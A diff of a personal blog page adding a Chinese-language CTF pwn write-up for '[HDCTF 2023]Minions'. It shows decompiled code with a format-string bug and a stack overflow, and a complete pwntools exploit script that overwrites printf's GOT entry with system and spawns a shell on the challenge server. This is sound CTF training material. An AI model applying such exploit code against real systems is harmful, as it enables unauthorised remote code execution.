@@ -33,8 +33,9 @@
 <meta property="og:image" content="http://example.com/2025/11/26/pwn-11/image-3.png">
 <meta property="og:image" content="http://example.com/2025/11/26/pwn-11/image-4.png">
 <meta property="og:image" content="http://example.com/2025/11/26/pwn-11/image-5.png">
+<meta property="og:image" content="http://example.com/2025/11/26/pwn-11/image-7.png">
 <meta property="article:published_time" content="2025-11-26T12:00:19.000Z">
-<meta property="article:modified_time" content="2025-11-29T14:25:01.971Z">
+<meta property="article:modified_time" content="2025-11-30T14:11:58.978Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
@@ -203,7 +204,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-11-29 22:25:01" itemprop="dateModified" datetime="2025-11-29T22:25:01+08:00">2025-11-29</time>
+                <time title="Modified: 2025-11-30 22:11:58" itemprop="dateModified" datetime="2025-11-30T22:11:58+08:00">2025-11-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -262,7 +263,15 @@
 <p>定位好位置后，我们只需要输入一个字典元素比如Poc中的{printf_got: backdoor}</p>
 <p>这个字典清晰地描述了我们的意图，即：“我想要在printf_got这个地址，写入backdoor这个值”</p>
 <p>我们也可以同时提供多个写入目标，例如 {addr1: val1, addr2: val2}，pwntools会自动帮你生成一个能完成所有写入的payload</p>
-
+<h2 id="HDCTF-2023-Minions"><a href="#HDCTF-2023-Minions" class="headerlink" title="[HDCTF 2023]Minions"></a>[HDCTF 2023]Minions</h2><img src="/2025/11/26/pwn-11/image-7.png" class=""> 
+<p>放进IDA，查看主函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nDo you have an invitation key?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">102</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;welcome,tell me more about you&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x40u</span>LL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s great.Do you like Minions?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;hdctf, <span class="number">0x28u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;sorry,you can&#x27;t in&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先进入vlun函数，查看vlun</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">208</span>]; <span class="comment">// [rsp+0h] [rbp-D0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to HDCTF.What you name?\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xD0u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还发现了一个后门</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_40075A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo HDCTF&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现格式化字符串漏洞，可以测试printf的偏移，然后将key改为102</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">24763</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">r&#x27;./1&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"> </span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">start_addr = elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 利用vuln()函数里格式化字符串漏洞  覆盖key 满足 key==102</span></span><br><span class="line">key_addr = <span class="number">0x6010A0</span></span><br><span class="line">payload = fmtstr_payload(offset, &#123;key_addr: <span class="number">0x66</span>&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name?\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 栈溢出 使函数返回 _start  为重新执行vuln()里的printf</span></span><br><span class="line">Padding = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span> + <span class="number">0x08</span>)</span><br><span class="line">payload_vuln = Padding + p64(start_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;tell me more about you&quot;</span>,payload_vuln)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Minions?&quot;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 利用vuln()函数里格式化字符串漏洞 修改 printf_got为system_plt</span></span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got: sys_plt&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name?\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 栈溢出 返回 _start重新执行 vuln()里的printf</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;tell me more about you&quot;</span>,payload_vuln)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Minions?&quot;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># send /bin/sh printf即system 调用 /bin/bash 得到shell</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name?\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -281,8 +290,8 @@
     <div class="post-nav">
       <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/2025/11/29/web-11/" rel="next" title="web_11">
-      web_11 <i class="fa fa-chevron-right"></i>
+    <a href="/2025/11/26/pwn-11/1/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -342,7 +351,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2023-%E5%88%9D%E8%B5%9B-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF"><span class="nav-number">1.</span> <span class="nav-text">[CISCN 2023 初赛]烧烤摊儿</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MoeCTF-2022-babyfmt"><span class="nav-number">2.</span> <span class="nav-text">[MoeCTF 2022]babyfmt</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2023-%E5%88%9D%E8%B5%9B-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF"><span class="nav-number">1.</span> <span class="nav-text">[CISCN 2023 初赛]烧烤摊儿</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MoeCTF-2022-babyfmt"><span class="nav-number">2.</span> <span class="nav-text">[MoeCTF 2022]babyfmt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HDCTF-2023-Minions"><span class="nav-number">3.</span> <span class="nav-text">[HDCTF 2023]Minions</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -356,7 +365,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
